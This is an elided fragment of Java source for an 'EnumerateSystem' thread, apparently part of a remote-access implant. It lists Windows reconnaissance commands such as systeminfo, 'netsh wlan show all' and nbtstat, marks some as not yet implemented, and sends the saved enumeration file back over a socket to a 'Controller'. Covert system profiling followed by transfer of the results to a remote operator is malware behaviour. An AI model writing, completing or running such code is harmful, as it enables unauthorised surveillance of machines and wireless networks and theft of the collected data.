...
public class EnumerateSystem extends Thread implements Runnable 
{
	...
	public static String ENUMERATE_SYSTEMINFO = "systeminfo";
			...
			//	NOT IMPLEMENTED YET!!!
			//
			public static String ENUMERATE_WIRELESS_CONFIGURATION = "netsh wlan show all";
			public static String ENUMERATE_WIRELESS_ESTABLISHED = "netsh wlan show interfaces";
			public static String ENUMERATE_NETBIOS = "nbtstat -a %userdomain%";
	...
	public void run()
	{
		try
		{
			...
			sktOut.println("ENUMERATION COMPLETE and saved at " + fleEnumeration + ". Searching for Controller to FTP enum results...");
			sktOut.flush();
				
			//try to transfer the file over the same socket
			 try	{	File_Transfer fileTransfer = new File_Transfer(File_Transfer.GET_FILE, fleEnumeration.getCanonicalPath(), sktOut);	} catch(Exception e){}
		...
		{
			Driver.sop("Exception caught in run mtd in " + this.strMyClassName);
		}
